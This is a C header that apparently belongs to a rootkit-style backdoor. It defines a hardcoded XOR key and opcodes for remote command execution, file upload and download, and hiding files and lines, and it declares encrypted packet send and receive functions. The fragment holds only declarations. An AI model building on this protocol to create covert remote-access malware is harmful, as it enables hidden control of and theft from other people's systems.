#ifndef PROTOCOL_H
#define PROTOCOL_H

#include <stdint.h>

#include "crypto.h"

#define CRYPTO_KEY    "wlk0m_xor_k3y_32bytes_padding__"
#define CRYPTO_KEYLEN 32

#define CMD_AUTH        0x01
#define CMD_EXEC        0x02
#define CMD_UPLOAD      0x03
#define CMD_DOWNLOAD    0x04
#define CMD_HIDE_FILE   0x05
#define CMD_UNHIDE_FILE 0x06
#define CMD_HIDE_LINE   0x07
#define CMD_UNHIDE_LINE 0x08
#define CMD_PING        0x09
#define CMD_PONG        0x0A

/**
 * @brief Sends a framed, XOR-encrypted packet.
 * @param fd       Socket file descriptor.
 * @param opcode   Command opcode.
 * @param payload  Data to send (may be NULL when len == 0).
 * @param len      Payload length in bytes.
 * @return 0 on success, -1 on failure.
 */
int send_packet(int fd, uint8_t opcode, const char *payload, uint32_t len);

/**
 * @brief Receives a framed packet and XOR-decrypts its payload.
 * @param fd       Socket file descriptor.
 * @param opcode   Output: received opcode.
 * @param payload  Output: heap-allocated NUL-terminated payload (caller frees).
 * @param len      Output: payload length.
 * @return 0 on success, -1 on failure.
 */
int recv_packet(int fd, uint8_t *opcode, char **payload, uint32_t *len);

#endif /* ! PROTOCOL_H */
